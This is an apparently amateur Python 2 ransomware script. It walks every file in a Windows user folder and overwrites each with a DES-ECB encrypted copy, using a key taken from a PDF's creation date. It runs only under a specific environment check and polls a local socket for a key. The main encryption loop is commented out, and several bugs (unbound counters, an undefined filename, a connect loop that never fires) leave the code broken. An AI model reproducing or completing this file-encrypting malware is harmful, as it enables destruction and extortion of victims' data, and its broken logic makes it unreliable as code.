# -*- coding: utf-8 -*-
import os, fnmatch, hashlib, base64, re, hashlib, time, thread, socket
from Crypto.Cipher import DES
from pyPdf import PdfFileReader
from time import gmtime, strftime
from Tkinter import *

#############################################################################
# NAME: encrypt()                                                           #
# DESCRIPTION: This function encrypts a bunch of data (text),               #
#           based on a key received.                                        #
# RETURN: It returns the encrypted data (cipher).                           #
#############################################################################
def encrypt(text):
    b = 8 - len(text)%8
    padd = ""
    if b:
        padd =  "." + "X" * (b - 1)
    des = DES.new(key, DES.MODE_ECB)
    cipher = des.encrypt(text + padd)
    encoded_cipher = base64.b64encode(cipher)
    return encoded_cipher

#############################################################################
# NAME: decrypt()                                                           #
# DESCRIPTION: This function decrypts a bunch of data (text),               #
#           based on a key received.                                        #
# RETURN: It returns the plain data.                                        #
#############################################################################
def decrypt(encoded_cipher):
    des = DES.new(key, DES.MODE_ECB)
    cipher = base64.b64decode(encoded_cipher)
    text = des.decrypt(cipher)
    charref = re.compile("\.X{0,7}" , re.VERBOSE)
    match_str = re.sub(charref , "" , text[len(text) - 8:])
    text_corrected = text[:len(text) - 8] + match_str
    return text_corrected

#############################################################################
# NAME: find()                                                              #
# DESCRIPTION: This function finds a regex pattern in a list of files       #
#            in a directory.                                                #
# RETURN: It returns the set of files matching the pattern                  #
#############################################################################
def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))

    return result

def md5(fname):
    hash = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash.update(chunk)
    return hash.hexdigest()

#############################################################################
# NAME: generate_write_encryption()                                                              #
# DESCRIPTION: This function finds a regex pattern in a list of files       #
#            in a directory.                                                #
# RETURN:                                           #
#############################################################################
def generate_write_encryption():
    try:
        with open(filename, 'rb+') as fd:
            # simplemente hacer "for line in f", lo que te daria "line"
            # Además, esto te cierra solo el objeto.
            buffer = fd.read()
            fd.seek(0)
            fd.write(encrypt(buffer))
            a = a + 1
    except:
        print "[-] An error ocurred [-]"
        print "\t" + filename
    return

#############################################################################
# NAME: generate_write_encryption()                                                              #
# DESCRIPTION: This function finds a regex pattern in a list of files       #
#            in a directory.                                                #
# RETURN:                                           #
#############################################################################
def restore_files():
    try:
        with open(filename, 'rb+') as fd:
            buffer = fd.read()
            fd.seek(0)
            fd.truncate()
            fd.write(decrypt(buffer))
            a = a + 1
    except:
        print "[-] An error ocurred [-]"
        print "\t" + filename
    return

checkCondition = lambda: os.path.exists("C:\\Program Files\\CrypTool\\") & os.path.isfile("C:\\Program Files\\CrypTool\\CrypTool.exe") & os.path.isfile("C:\\Users\\radiactivo\\Desktop\\sample.pdf")

key = lambda: hashlib.sha256(PdfFileReader(file("C:\\Users\\radiactivo\\Desktop\\sample.pdf", "rb")).getDocumentInfo()['/CreationDate']).digest()[:8]

if checkCondition() == False:
    exit()

key = key()
list_of_files = find('*.*', 'C:\\Users\\radiactivo\\')
a = 0
print "Starting encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
#for filename in list_of_files:
    #generate_write_encryption()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host ="localhost"
port = 8000

i = 0

def ts():
   s.send('e'.encode())
   data = ''
   public_key = s.recv(1024).decode()
   print "\t Data received: ", public_key
   return public_key

print s
while (i < 6) & (s is None):
    s.connect((host,port))
    i = i + 1
    print("[*] Round: " + i +" [*]")

while 2:
   ts()

s.close ()


print "Ending encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
print "Number of files read = ", len(list_of_files)
print "Number of files encrypted = ", a
raw_input("Press Enter to continue")
